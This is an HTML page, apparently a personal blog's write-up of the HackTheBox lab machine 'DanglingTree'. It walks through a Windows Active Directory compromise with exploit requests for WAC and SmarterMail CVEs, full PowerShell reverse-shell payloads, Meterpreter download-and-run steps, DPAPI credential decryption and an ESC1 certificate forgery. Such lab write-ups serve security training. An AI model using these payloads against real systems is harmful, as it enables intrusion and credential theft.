@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>DanglingTree - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox DanglingTree (Medium, Windows/AD) full write up: Windows Admin Center REST API RCE (CVE-2026-26119), SmarterMail force-reset-password (CVE-2026-23760), SmarterMail crypto key decrypt, DPAPI credential theft, ghost AD CS template ESC1."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-windows{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#60a5fa}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / windows</p>
+      <h1>DanglingTree</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-windows">Windows</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>DanglingTree is a medium AD box built on two forgotten services and a dead certificate template. A stale <strong>Windows Admin Center 2511</strong> on port 6600 runs PowerShell through its REST API (<strong>CVE-2026-26119</strong>) as <code>anderson.w</code>. A loopback <strong>SmarterMail</strong> install lets us reset <code>svc_mail</code>'s password unauthenticated (<strong>CVE-2026-23760</strong>), and a Volume Mount command hands us a shell as <code>svc_mail</code>. SmarterMail's hardcoded crypto key decrypts <code>noah.b</code>'s stored password. DPAPI abuse on noah's saved credentials leaks <code>alex.o</code>, whose SUPPORT-IT group can ForceChangePassword <code>jake.h</code>. Jake can create AD CS template objects, so we materialize the <em>ghost</em> <code>EmployeeAuthTemplate</code> the CA already publishes, turn it ESC1, and forge an Administrator certificate.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Windows Admin Center administration and REST API knowledge</li>
+        <li>AD / BloodHound enumeration</li>
+        <li>AD CS attack path understanding</li>
+        <li>DPAPI credential extraction fundamentals</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>WAC REST API code execution (CVE-2026-26119)</li>
+        <li>SmarterMail unauthenticated force-reset-password (CVE-2026-23760)</li>
+        <li>Decrypting SmarterMail stored passwords with the shipped key + IV</li>
+        <li>Ghost/orphaned certificate templates - create the object the CA already references (ESC1)</li>
+        <li>SharpDPAPI decryption of saved Enterprise Credentials</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>Full port scan against <code>danglingtree.htb</code>. Classic DC profile plus one oddball high port.</p>
+      <pre>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb)
+445/tcp   open  microsoft-ds
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3389/tcp  open  ms-wbt-server
+6600/tcp  open  ssl/mshvlm?
+9389/tcp  open  mc-nmf        .NET Message Framing</pre>
+      <p>Null auth works on SMB, though nxc's RPC-based share enum is denied - <code>smbclient</code> tree-connects fine and lists a non-default share:</p>
+      <pre>smbclient -L //danglingtree.htb/ -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        IT              Disk
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share</pre>
+      <p>The <code>IT</code> share holds a PDF with a set of provided credentials:</p>
+      <pre>anderson.w : R3dT3am@Acc3ss#01</pre>
+      <p>Running our enum wrapper with those creds paints the user landscape: <code>svc_mail</code>, <code>jake.h</code>, <code>noah.b</code>, <code>alex.o</code>, <code>anderson.w</code>, and groups worth filing away (<code>Cert_Managers</code>, <code>Helpdesk_Cert_Support</code>, <code>Template_Editors</code>, <code>DevOps_PKI</code>, <code>support-it</code>, <code>Windows Admin Center CredSSP</code>).</p>
+
+      <h2>Foothold</h2>
+      <h3>Windows Admin Center RCE</h3>
+      <p>Port 6600 serves a <strong>Windows Admin Center</strong> login page over HTTPS - <code>https://danglingtree.htb:6600</code>. The anderson creds sign us in. The banner reads <strong>WAC Version 2511 Build 2.6.4.11</strong>, which matches the Semperis research on <code>CVE-2026-26119</code> - WAC exposes REST endpoints that execute commands on managed nodes. The one that matters sits at:</p>
+      <pre>/api/services/WinREST/Powershell/nodes//InvokeCommand</pre>
+      <p>Each call needs a fresh authenticated session, but a general-purpose payload looks like this:</p>
+      <pre>{"properties":{"script":"cmd.exe /c &gt;c:\temp\out.txt; $a=get-content \"c:\temp\out.txt"; return $a"}}</pre>
+      <p>Swapping in a PowerShell reverse shell (base64-encode the script to dodge the escape sequences):</p>
+      <pre>{
+"properties": {
+"script": "$client = New-Object System.Net.Sockets.TCPClient('[IP]',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+"command": "Get-WACSMServerConnectionStatus",
+"module": "Microsoft.SME.ServerManager",
+"state": "ready",
+"useInProcRunspace": false,
+"invokeMode": "Polling"
+}
+}</pre>
+      <p>Reverse shell as <code>danglingtree\anderson.w</code>.</p>
+
+      <h2>Lateral Movement</h2>
+      <h3>SmarterMail on loopback → svc_mail</h3>
+      <p>The box runs <strong>SmarterMail</strong> bound to <code>127.0.0.1:17017</code>. Upgrade the raw shell to Meterpreter for easy forwarding.</p>
+      <pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o met.exe
+python3 -m http.server 8888</pre>
+      <pre>msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [IP]
+set LPORT 4444
+run</pre>
+      <p>Fetch and run it from the anderson shell, then forward the loopback port:</p>
+      <pre>$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri http://[IP]:8888/met.exe -UseBasicParsing -OutFile C:\Windows\Temp\met.exe
+Start-Process C:\Windows\Temp\met.exe</pre>
+      <pre>meterpreter &gt; portfwd add -l 17017 -p 17017 -r 127.0.0.1</pre>
+      <p>SmarterMail's <code>force-reset-password</code> endpoint (<code>CVE-2026-23760</code>) resets <code>svc_mail</code>'s password with no authentication at all:</p>
+      <pre>curl -k -X POST "http://localhost:17017/api/v1/auth/force-reset-password" \
+  -H "Content-Type: application/json" \
+  -d '{"IsSysAdmin":"true","OldPassword":"watever","Username":"svc_mail","NewPassword":"NewPassword123!@#","ConfirmPassword":"NewPassword123!@#"}'
+
+{"username":"","errorCode":"","errorData":"","debugInfo":"check1\r\ncheck2\r\ncheck3\r\ncheck4.2\r\ncheck5.2\r\ncheck6.2\r\ncheck7.2\r\ncheck8.2\r\n","success":true,"resultCode":200}</pre>
+      <p>Login to the dashboard at <code>localhost:17017</code> as <code>svc_mail</code>. <code>Settings -&gt; Volume Mounts</code> lets us create a volume whose <strong>Volume Mount Command</strong> runs as an OS command - a clean RCE sink. Drop the reverse shell there:</p>
+      <pre>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+      <p>Shell as <code>svc_mail</code>.</p>
+
+      <h3>noah.b from SmarterMail's own crypto</h3>
+      <p>SmarterMail keeps mailbox settings per-user. As <code>svc_mail</code> we can read noah's backup config:</p>
+      <pre>C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b\settings.json</pre>
+      <p>The <code>password_encrypted</code> field holds his credential. It's encrypted with SmarterMail's own crypto helper - <code>SmarterMail.Standard.dll</code> ships the IV and key hardcoded in <code>SmarterMail.Standard.Utilities.CryptographyHelper</code>. Pull them from the DLL and decrypt:</p>
+      <pre>noah.b : RiverDragon#Storm25</pre>
+      <p>RunAs into a shell as noah:</p>
+      <pre>RunasCs2.exe noah.b "RiverDragon#Storm25" cmd.exe -r [IP]:4446</pre>
+      <p>User flag.</p>
+
+      <h2>Privilege Escalation</h2>
+      <h3>alex.o from a DPAPI credential file</h3>
+      <p><code>cmdkey /list</code> on noah's session shows a saved credential for <code>alex.o</code>. Those live as DPAPI-protected files in noah's profile - decrypt them with <code>SharpDPAPI</code>, which can reuse noah's own password as the master key:</p>
+      <pre>certutil -urlcache -split -f http://[IP]:80/SharpDPAPI.exe SharpDPAPI.exe
+.\SharpDPAPI.exe credentials /password:RiverDragon#Storm25</pre>
+      <pre>[*] Triaging Credentials for current user
+
+Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
+
+  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    LastWritten      : 3/27/2026 3:03:38 PM
+    TargetName       : Domain:target=PC01.danglingtree.htb
+    UserName         : alex.o
+    Credential       : SunsetMountainPeak@2025</pre>
+      <p><code>alex.o : SunsetMountainPeak@2025</code>. BloodHound with that account maps the ACLs:</p>
+      <pre>bloodhound-python -u alex.o -p 'SunsetMountainPeak@2025' -d danglingtree.htb -ns [IP] -c All --zip</pre>
+      <p><code>alex.o</code> sits in <strong>SUPPORT-IT</strong>, which holds <code>ForceChangePassword</code> on <code>jake.h</code>. Reset his password:</p>
+      <pre>bloodyad --host dc.danglingtree.htb -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' set password jake.h 'NewPassword123!@#'
+
+[+] Password changed successfully!</pre>
+
+      <h3>ESC1 via a ghost certificate template</h3>
+      <p><code>certipy-ad find</code> as jake shows the CA is open (<code>Enroll</code> to Authenticated Users) but reports a surprise:</p>
+      <pre>Certificate Templates : [!] Could not find any certificate templates</pre>
+      <p>No <code>pKICertificateTemplate</code> objects exist, yet an LDAP query against the CA's <code>certificateTemplates</code> attribute lists names like <code>EmployeeAuthTemplate</code>, <code>VPNUserTemplate</code>, <code>WebServer</code>. The CA references templates that were never created (or were deleted) - a gap between what's <em>published</em> and what <em>exists</em>.</p>
+      <p>The missing piece is a principal who can create the object. BloodHound shows <code>jake.h</code> holds <code>Create-Child</code> on both <code>CN=Certificate Templates</code> and <code>CN=OID</code>. Creating an object under the already-published name <code>EmployeeAuthTemplate</code> sidesteps the <code>ManageCA</code> publish requirement entirely - the CA already trusts that name.</p>
+      <pre>msfconsole -q
+use auxiliary/admin/ldap/ad_cs_cert_template
+set rhosts dc.danglingtree.htb
+set username jake.h
+set password NewPassword123!@#
+set domain danglingtree.htb
+set CERT_TEMPLATE EmployeeAuthTemplate
+set Action CREATE
+run</pre>
+      <p>The module materializes a template with ESC1-favorable defaults (client-auth EKU, enrollee-supplied subject, no approval). Re-running <code>certipy-ad find -vulnerable</code> now flags <code>EmployeeAuthTemplate</code> for ESC1.</p>
+      <p>Grab the domain SID via <code>lsaquery</code> and subtract <code>-500</code> for the built-in Administrator:</p>
+      <pre>rpcclient -U 'DANGLINGTREE\jake.h%NewPassword123!@#' dc.danglingtree.htb -c 'lsaquery'</pre>
+      <pre>certipy-ad req -u 'jake.h@danglingtree.htb' -p 'NewPassword123!@#' -dc-ip [IP] \
+  -dc-host dc.danglingtree.htb -ca 'danglingtree-DC-CA' -template 'EmployeeAuthTemplate' \
+  -upn 'administrator@danglingtree.htb' -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
+  -dynamic-endpoint -timeout 60</pre>
+      <p><code>-dynamic-endpoint</code> and <code>-timeout 60</code> were both required for this Server 2025 build's RPC endpoint to answer. Out comes <code>administrator.pfx</code>. PKINIT with it, then <code>UnPAC-the-hash</code>:</p>
+      <pre>certipy-ad auth -pfx administrator.pfx -dc-ip [IP] -domain danglingtree.htb</pre>
+      <p>Administrator's NT hash drops out. Psexec:</p>
+      <pre>impacket-psexec 'danglingtree.htb/Administrator@dc.danglingtree.htb' -hashes ':<hash>'</pre>
+      <p>Root.</p>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>WAC on a high port is a management plane</strong> - fingerprint the version, then the REST API becomes an authenticated RCE.</li>
+        <li><strong>Loopback services are the second attack surface</strong> - after the first shell, port-forward and hit the unauthenticated dashboard APIs.</li>
+        <li><strong>Saved credentials leak</strong> - <code>cmdkey /list</code> plus DPAPI files hand over other users' passwords.</li>
+        <li><strong>Ghost certificate templates are instant ESC1</strong> - when a CA references a template with no object, <code>Create-Child</code> on the templates container materializes it.</li>
+        <li><strong>Decrypt, don't crack</strong> - SmarterMail ships its encryption key and IV inside its own DLL.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
